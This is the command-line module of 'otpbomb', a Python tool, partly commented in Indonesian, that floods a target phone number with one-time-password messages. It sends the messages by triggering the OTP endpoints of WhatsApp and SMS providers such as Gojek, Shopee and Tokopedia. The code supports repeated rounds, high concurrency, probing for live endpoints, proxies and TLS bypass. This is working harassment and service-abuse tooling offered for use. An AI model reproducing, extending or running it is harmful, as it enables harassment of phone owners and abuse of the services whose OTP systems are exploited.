"""otpbomb — OTP trigger blast: WhatsApp-first and SMS channels, async and loud.

    python3 -m otpbomb list
    python3 -m otpbomb probe --cc 62                    # rank live endpoints
    python3 -m otpbomb blast 081234567890 --rounds 3 --concurrency 32
    python3 -m otpbomb blast +6281234567890 --category wa --per-provider 5 --json out.json
    python3 -m otpbomb blast 0812... --only gojek,shopee,tokopedia --wave 2 --verbose
    python3 -m otpbomb selftest

Totals: rounds x providers x per-provider requests. SIGINT prints the summary.
"""
from __future__ import annotations

import argparse
import asyncio
import json
import sys
import time

from . import providers as prov_mod
from .engine import BLOCKED, ERR, FAIL, OK, Engine, Options
from .phone import PhoneError, normalise

_ORDER = {OK: 0, FAIL: 1, BLOCKED: 2, ERR: 3}


def _base_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="otpbomb",
        description="OTP blast: WhatsApp-preferred + SMS provider matrix",
        epilog="contoh: python3 -m otpbomb blast 081234567890 --rounds 3 --concurrency 32",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    sub = p.add_subparsers(dest="cmd")

    def common(sp: argparse.ArgumentParser) -> None:
        sp.add_argument("--cc", default="62", help="country code default (62)")
        sp.add_argument("--category", choices=["all", "wa", "sms"], default="all")
        sp.add_argument("--tier", choices=["live", "guess", "all"], default="live",
                        help="live = hasil probe (default), guess = tebakan, all")
        sp.add_argument("--all", dest="tier_all", action="store_true",
                        help="shortcut --tier all")
        sp.add_argument("--only", default="", help="daftar provider dipisah koma")
        sp.add_argument("--skip", default="", help="provider yang dilewati")
        sp.add_argument("--providers-file", default="", help="JSON list provider kustom")
        sp.add_argument("--proxy", default=None, help="http://127.0.0.1:8080 atau socks5://")
        sp.add_argument("-H", "--header", dest="headers", action="append", default=[],
                        metavar="K:V", help="header tambahan (bisa diulang)")
        sp.add_argument("--cookie", "--cookies", dest="cookies", default="",
                        help="cookie mentah a=b; c=d")
        sp.add_argument("-k", "--insecure", action="store_true", help="matikan verifikasi TLS")
        sp.add_argument("--timeout", type=float, default=12.0)
        sp.add_argument("--concurrency", type=int, default=24)
        sp.add_argument("--jitter", type=float, default=0.35)
        sp.add_argument("-v", "--verbose", action="store_true")
        sp.add_argument("-q", "--quiet", action="store_true")

    b = sub.add_parser("blast", help="kirim OTP berulang")
    b.add_argument("phone", help="nomor target, mis. 081234567890 / +62812...")
    b.add_argument("--rounds", type=int, default=1, help="jumlah gelombang penuh")
    b.add_argument("--per-provider", type=int, default=1, help="request per provider per gelombang")
    b.add_argument("--wave", dest="wave_interval", type=float, default=0.0,
                   help="jeda antar gelombang (detik)")
    b.add_argument("--retries", type=int, default=2)
    b.add_argument("--backoff", type=float, default=1.6)
    b.add_argument("--stop-after-ok", type=int, default=0, help="berhenti setelah N OTP sukses")
    b.add_argument("--json", dest="json_out", default="", help="simpan hasil ke file (atau -)")
    b.add_argument("--dry-run", action="store_true")
    common(b)

    pr = sub.add_parser("probe", help="uji endpoint hidup/mati")
    pr.add_argument("--json", dest="json_out", default="", help="simpan hasil probe (atau -)")
    common(pr)
    pr.set_defaults(tier="all")  # probe selalu menyapu semua tier

    sub.add_parser("list", help="tampilkan semua provider")
    sub.add_parser("selftest", help="tes offline, tanpa jaringan")
    return p


def _load(extra_file: str) -> None:
    if not extra_file:
        return
    try:
        with open(extra_file, encoding="utf-8") as fh:
            raw = json.load(fh)
    except OSError as exc:
        sys.exit(f"[!] providers-file tidak terbaca: {exc}")
    except json.JSONDecodeError as exc:
        sys.exit(f"[!] providers-file bukan JSON valid: {exc}")
    if not isinstance(raw, list):
        sys.exit("[!] providers-file harus list JSON")
    seen = {p.name for p in prov_mod.REGISTRY}
    for d in raw:
        if not isinstance(d, dict) or not d.get("url"):
            sys.exit(f"[!] entri provider tidak valid: {d!r}")
        prov = prov_mod.Provider.from_dict(d)
        if prov.method != "GET" and not (prov.form or prov.json_body):
            sys.exit(f"[!] {prov.name}: method {prov.method} tanpa form/json_body")
        if prov.name in seen:
            continue
        prov_mod.REGISTRY.append(prov)
        seen.add(prov.name)


def _pick(args) -> list:
    only = [s for s in args.only.split(",") if s.strip()]
    skip = [s for s in args.skip.split(",") if s.strip()]
    tier = "all" if getattr(args, "tier_all", False) else args.tier
    try:
        pool = prov_mod.select(only or None, skip or None, args.category, tier)
    except KeyError as exc:
        sys.exit(f"[!] provider tidak dikenal: {exc}. Jalankan `list`.")
    if not pool:
        sys.exit("[!] nol provider setelah filter")
    return pool


def _opts(args) -> Options:
    return Options(
        timeout=max(1.0, args.timeout),
        concurrency=max(1, args.concurrency),
        jitter=max(0.0, args.jitter),
        proxy=args.proxy,
        verbose=args.verbose,
        quiet=args.quiet,
        retries=max(0, getattr(args, "retries", 2)),
        backoff=max(1.0, getattr(args, "backoff", 1.6)),
        rounds=max(1, getattr(args, "rounds", 1)),
        per_provider=max(1, getattr(args, "per_provider", 1)),
        wave_interval=max(0.0, getattr(args, "wave_interval", 0.0)),
        stop_after_ok=max(0, getattr(args, "stop_after_ok", 0)),
        extra_headers=_headers(args),
        cookies=getattr(args, "cookies", ""),
        insecure=getattr(args, "insecure", False),
    )


def _headers(args) -> dict:
    out = {}
    for raw in getattr(args, "headers", []) or []:
        if ":" in raw:
            k, _, v = raw.partition(":")
        elif "=" in raw:
            k, _, v = raw.partition("=")
        else:
            sys.exit(f"[!] header tidak valid (pakai K:V): {raw!r}")
        if not k.strip():
            sys.exit(f"[!] header tanpa nama: {raw!r}")
        out[k.strip()] = v.strip()
    return out


def cmd_list(_args) -> int:
    print(f"{'provider':<16}{'chan':<6}{'tier':<7}{'method':<7}note")
    for p in prov_mod.REGISTRY:
        print(f"{p.name:<16}{p.category:<6}{p.tier:<7}{p.method:<7}{p.note}")
    live = sum(1 for p in prov_mod.REGISTRY if p.tier == "live")
    print(f"\n{len(prov_mod.REGISTRY)} provider "
          f"({sum(1 for p in prov_mod.REGISTRY if p.category == 'wa')} WA / "
          f"{sum(1 for p in prov_mod.REGISTRY if p.category == 'sms')} SMS, {live} tier live)")
    return 0


def cmd_selftest(_args) -> int:
    from .selftest import run

    return run()


def cmd_probe(args) -> int:
    _load(args.providers_file)
    pool = _pick(args)
    ctx = normalise("081234567890", args.cc)
    eng = Engine(ctx, _opts(args))
    res = asyncio.run(eng.probe(pool))
    res.sort(key=lambda r: (_ORDER.get(r.verdict, 9), r.provider))
    live = [r for r in res if r.verdict == "ok"]
    print(f"\nlive: {len(live)}/{len(res)}  -> "
          + (",".join(r.provider for r in live) if live else "(tidak ada)"))
    payload = {"generated": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
               "live": [r.provider for r in live],
               "results": [r.__dict__ for r in res]}
    _dump(args.json_out, payload)
    return 0 if live else 1


def cmd_blast(args) -> int:
    _load(args.providers_file)
    pool = _pick(args)
    try:
        ctx = normalise(args.phone, args.cc)
    except PhoneError as exc:
        sys.exit(f"[!] {exc}")

    opts = _opts(args)
    total = max(1, opts.rounds) * len(pool) * max(1, opts.per_provider)
    print(f"target {ctx['e164']}  provider {len(pool)}  "
          f"({sum(1 for p in pool if p.category == 'wa')} WA / "
          f"{sum(1 for p in pool if p.category == 'sms')} SMS)  "
          f"total request ~{total}  concurrency {opts.concurrency}")

    if args.dry_run:
        for p in pool:
            print(f"  {p.category:<4} {p.method:<5} {p.url}")
        return 0

    eng = Engine(ctx, opts)
    t0 = time.time()
    loop = asyncio.new_event_loop()
    try:
        asyncio.set_event_loop(loop)
        loop.run_until_complete(eng.run(pool))
    except KeyboardInterrupt:
        print("\n[!] dihentikan — ringkasan parsial:")
        for t in asyncio.all_tasks(loop):
            t.cancel()
    finally:
        elapsed = time.time() - t0
        summary = eng.stats.summary(elapsed)
        print("\n== ringkasan ==")
        print(json.dumps(summary, indent=2))
        top = sorted(eng.hits.items(), key=lambda kv: -kv[1])[:10]
        if top:
            print("terbanyak memicu: " + ", ".join(f"{k}x{v}" for k, v in top))
        _dump(args.json_out, {"target": ctx["e164"], "summary": summary,
                              "notes": eng.notes,
                              "results": [r.__dict__ for r in eng.results]})
    return 0 if eng.stats.ok else 2


def _dump(path: str, payload: dict) -> None:
    if not path:
        return
    text = json.dumps(payload, indent=2)
    if path == "-":
        print(text)
    else:
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(text + "\n")
        print(f"[+] hasil -> {path}")


def main(argv: list[str] | None = None) -> int:
    p = _base_parser()
    args = p.parse_args(argv)
    if not args.cmd:
        p.print_help()
        return 0
    if args.cmd == "list":
        return cmd_list(args)
    if args.cmd == "selftest":
        return cmd_selftest(args)
    if args.cmd == "probe":
        return cmd_probe(args)
    return cmd_blast(args)
